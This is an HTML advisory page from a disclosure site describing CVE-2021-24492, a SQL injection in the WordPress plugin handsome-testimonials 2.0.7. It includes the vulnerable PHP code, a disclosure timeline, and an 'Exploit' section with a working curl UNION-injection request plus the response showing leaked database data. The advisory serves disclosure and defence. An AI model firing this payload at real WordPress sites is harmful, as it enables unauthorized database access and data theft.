<!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    
      <title>wp-plugin : handsome-testimonials | Code Vigilant : to err is human.. To fix is Humanity</title>
    
    <link rel="stylesheet" href="/css/style.css" />
    <link rel="stylesheet" href="/css/fonts.css" />
    
  </head>

  <body>
<a href="https://codevigilant.com"><img src="/banner.png" class="header-image" width="508" height="111" alt=""  /></a>

<nav class="menu">
	<ul class="menu__list">
		<li class="menu__item">
			<a class="menu__link" href="/" >
				
				<span class="menu__text">Home</span>
				
			</a>
		</li>
		<li class="menu__item menu__dropdown">
			<a class="menu__link" href="/disclosure/">
				
				<span class="menu__text">Disclosure</span>

				
			</a>
			<input type="checkbox" id="Disclosure">
			<ul class="submenu__list">
				
					<li class="menu__item">
					<a class="menu__link" href="/category/injection/">
						
						<span class="menu__text">INJECTION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/cross-site-scripting-xss/">
						
						<span class="menu__text">CROSS-SITE SCRIPTING (XSS)</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/information-disclosure/">
						
						<span class="menu__text">INFORMATION DISCLOSURE</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/local-file-inclusion/">
						
						<span class="menu__text">LOCAL FILE INCLUSION</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/ssrf/">
						
						<span class="menu__text">SSRF/XSPA</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/components-with-known-vulnerabilities/">
						
						<span class="menu__text">COMPONENTS WITH KNOWN VULNERABILITIES</span>
						
					</a>
					</li>
				
					<li class="menu__item">
					<a class="menu__link" href="/category/unvalidated-redirects-and-forwards/">
						
						<span class="menu__text">UNVALIDATED REDIRECTS AND FORWARDS</span>
						
					</a>
					</li>
				
			</ul>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/blog/" >
				
				<span class="menu__text">Blog</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/feed.xml" >
				
				<span class="menu__text">RSS Feed</span>
				
			</a>
		</li>
		<li class="menu__item">
			<a class="menu__link" href="/about-team/" >
				
				<span class="menu__text">About Team</span>
				
			</a>
		</li>
	</ul>
</nav>



<main>
	<br />
<center><a href=""><span class="title">Wp Plugin Handsome Testimonials</span></a></center>

<h3><u>Plugin Details</u></h3><div>Plugin Name: <a href="https://wordpress.org/plugins/handsome-testimonials/" rel="noreferrer noopener nofollow" target="_blank">wp-plugin : handsome-testimonials</a></div>
<div>Effected Version : 2.0.7 (and most probably lower version's if any)</div>
<div>Vulnerability : <a href="/category/injection/">Injection</a></div>
<div>Minimum Level of Access Required : Subscriber</div>
<div>CVE Number : CVE-2021-24492</div>
<div>Identified by : <a href="/author/shreya_pohekar/">Shreya Pohekar</a></div>
<div><a href="https://wpscan.com/plugin/handsome-testimonials/" rel="noreferrer noopener nofollow" target="_blank">WPScan Reference URL</a></div>
 
<h3><u>Disclosure Timeline</u></h3>
<ul>
	<li>

<div>April 28, 2021: Issue Identified and Disclosed to WPScan</div>

	</li>
	
	<li>
	June 29, 2021 : Plugin  Updated</li>
	
	
	<li>June 29, 2021 : CVE Assigned</li>
	
	<li>June 29, 2021 : Public Disclosure</li>
</ul>



<h3><u>Technical Details</u></h3>

<p>The <a href="https://plugins.trac.wordpress.org/browser/handsome-testimonials/tags/2.0.7/includes/tst_shortcode_generator.php?rev=2536922#L445" target="_blank" rel="noreferrer noopener nofollow">hndtst_action_instance_callback</a>
 AJAX call, is available to all the authenticated roles, does not sanitise, validate or escape the POST parameter <code>hndtst_previewShortcodeInstanceId</code> before using it in a SQL statement, leading to a SQL Injection issue.</p>
<p>Vulnerable Code: <a href="https://plugins.trac.wordpress.org/browser/handsome-testimonials/tags/2.0.7/includes/tst_shortcode_generator.php?rev=2536922#L451" target="_blank" rel="noreferrer noopener nofollow">tst_shortcode_generator.php#L451</a>
</p>
<pre><code>448:    $hndtst_previewShortcodeInstanceId = ( $_POST['hndtst_previewShortcodeInstanceId'] );
449:    $table = $wpdb-&gt;prefix . 'hndtst_saved';
450:
451:    $row = $wpdb-&gt;get_row(
452:	&quot;
453:	SELECT id,name,shortcode,options
454:	FROM $table
455:	WHERE id = &quot; . $hndtst_previewShortcodeInstanceId
456:    );

</code></pre><h4 id="fixed-code">Fixed Code:</h4>
<p><a href="https://plugins.trac.wordpress.org/changeset/2551189/handsome-testimonials/trunk/includes/tst_shortcode_generator.php" target="_blank" rel="noreferrer noopener nofollow">https://plugins.trac.wordpress.org/changeset/2551189/handsome-testimonials/trunk/includes/tst_shortcode_generator.php</a>
</p>
<h4 id="poc-screenshot">PoC Screenshot</h4>
<p><img src="/disclosure_screenshots/handsome-testimonials-poc.png" alt="PoC Screenshot">
<img src="/disclosure_screenshots/handsome-testimonials-poc-1.png" alt="PoC Screenshot1"></p>
<h4 id="exploit">Exploit</h4>
<pre><code>curl -i -s -k  -X $'POST' \
    -H $'X-Requested-With: XMLHttpRequest' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36' -H $'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H $'Origin: http://172.28.128.50' -H $'Referer: http://172.28.128.50/wp-admin/edit.php?post_type=testimonial&amp;page=htst_design' \
    -b $'wordpress_logged_in_232395f24f6cff47569f2739c21385d6=subscriber%7C1620821016%7CmjyU4p2RKaOmJ3W6wlYJx5mOHJLp5Yi7h7OtAAmDK6H%7C43d2cd5b8f095300fbedf7f756b9a945c81d541f6cc4779a7136b8b1a8586b68; wordpress_test_cookie=WP%20Cookie%20check; wp-settings-time-4=1619611416; wordpress_232395f24f6cff47569f2739c21385d6=subscriber%7C1620821016%7CmjyU4p2RKaOmJ3W6wlYJx5mOHJLp5Yi7h7OtAAmDK6H%7C81a30b71670b4777459956b2817a0f25991602c6649b8f55e822d504e3d4afc6; wordpress_232395f24f6cff47569f2739c21385d6=subscriber%7C1620821016%7CmjyU4p2RKaOmJ3W6wlYJx5mOHJLp5Yi7h7OtAAmDK6H%7C81a30b71670b4777459956b2817a0f25991602c6649b8f55e822d504e3d4afc6;' \
    --data-binary $'action=hndtst_previewShortcodeInstance&amp;hndtst_previewShortcodeInstanceId=-5049 UNION ALL SELECT current_user(),current_user(),CONCAT(0x716b7a6b71,0x5a4a547a475a4e5657516472454b4d4c524764525a69416b7a767961715957584947776954594d4d,0x716a717a71),NULL-- -' \
    $'http://172.28.128.50/wp-admin/admin-ajax.php'

</code></pre><h4 id="response">Response</h4>
<pre><code>HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 28 Apr 2021 12:06:18 GMT
Content-Type: application/json; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Access-Control-Allow-Origin: http://172.28.128.50
Access-Control-Allow-Credentials: true
X-Robots-Tag: noindex
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Referrer-Policy: strict-origin-when-cross-origin
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0

{&quot;success&quot;:true,&quot;data&quot;:{&quot;id&quot;:&quot;bob@localhost&quot;,&quot;design&quot;:&quot;qkzkqZJTzGZNVWQdrEKMLRGdRZiAkzvyaqYWXIGwiTYMMqjqzq&quot;,&quot;shortcode&quot;:&quot;qkzkqZJTzGZNVWQdrEKMLRGdRZiAkzvyaqYWXIGwiTYMMqjqzq&quot;,&quot;hndtst_options&quot;:false,&quot;name&quot;:&quot;bob@localhost&quot;,&quot;error&quot;:false}}

</code></pre>

<br />


</main>

  <footer>
  
  
  <hr/>
  Â© <a href="https://anantshri.info">Anant Shrivastava</a> 2021
  
  </footer>
  </body>
</html>

